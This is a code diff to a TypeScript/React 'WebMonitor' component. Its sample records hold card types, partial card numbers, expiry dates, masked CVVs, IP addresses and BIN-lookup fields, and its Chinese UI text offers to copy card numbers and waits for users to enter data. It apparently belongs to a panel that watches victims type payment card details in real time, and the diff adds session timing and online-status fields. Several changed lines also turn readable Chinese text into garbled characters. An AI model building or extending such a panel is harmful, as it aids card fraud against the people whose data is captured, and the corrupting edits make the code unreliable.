@@ -172,7 +172,10 @@ const submissionData: UserSubmission[] = [
       { timestamp: "10:15", cardType: "prepaid", partialCard1: "3782", partialCard2: "234", fullCard: "3782 **** **** 1234", expiryDate: "05/26", cvv: "***" },
       { timestamp: "10:12", cardType: "debit", partialCard1: "6011", partialCard2: "567", fullCard: "6011 **** **** 5678", expiryDate: "07/27", cvv: "***" },
       { timestamp: "10:10", cardType: "credit", partialCard1: "4532", partialCard2: "890", fullCard: "4532 **** **** 8901", expiryDate: "04/28", cvv: "***" }
-    ]
+    ],
+    enterTime: "10:05:22",
+    updateTime: "10:22:15",
+    isOffline: false
   },
   {
     id: "13716",
@@ -188,7 +191,7 @@ const submissionData: UserSubmission[] = [
     dataSize: "1.2Mb",
     fieldsCount: 15,
     ipAddress: "192.168.1.88"
-    // 没有 binLookup 和 realtimeInput，表示用户还未输入数据
+    // 没有 binLookup 和 realtimeInput，表示用��还未输入数据
   },
   {
     id: "13800",
@@ -499,7 +502,7 @@ export function WebMonitor() {
                           : 'border-gray-300 bg-gray-50'
                       }`}
                       onClick={() => copyToClipboard(getFieldValue(submission.id, 'cardNumber'))}
-                      title="点击复制卡号"
+                      title="���击复制卡号"
                     >
                       <span className="relative">
                         {getFieldValue(submission.id, 'cardNumber')}
@@ -546,7 +549,7 @@ export function WebMonitor() {
                 ) : (
                   <div className="flex items-center justify-center py-4 mb-0.5">
                     <div className="text-sm text-muted-foreground italic">
-                      等待用户输入数据...
+                      等��用户输入数据...
                     </div>
                   </div>
                 );
